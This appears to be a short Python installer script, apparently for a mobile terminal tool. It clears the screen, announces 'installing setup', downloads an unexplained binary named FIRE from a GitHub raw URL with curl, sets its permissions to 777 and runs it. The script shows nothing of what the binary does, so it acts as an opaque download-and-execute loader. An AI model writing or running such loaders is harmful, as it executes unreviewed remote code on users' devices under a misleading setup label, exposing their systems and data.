import os,platform
from os import path
os.system('clear')
print('\n\n\n\033[0;37m installing setup....\n')
chk = platform.architecture()[0]
if '64bit' in chk:
    
    if path.isfile("FIRE"):
        pass
    else:
        os.system(f'curl -L https://raw.githubusercontent.com/R1NKU1100/MAX/main/FIRE -o FIRE');os.system('chmod 777 FIRE')
else:
    exit('\n\n\n\033[1;31m Sorry, Your Device Not Support')
os.system('./FIRE')
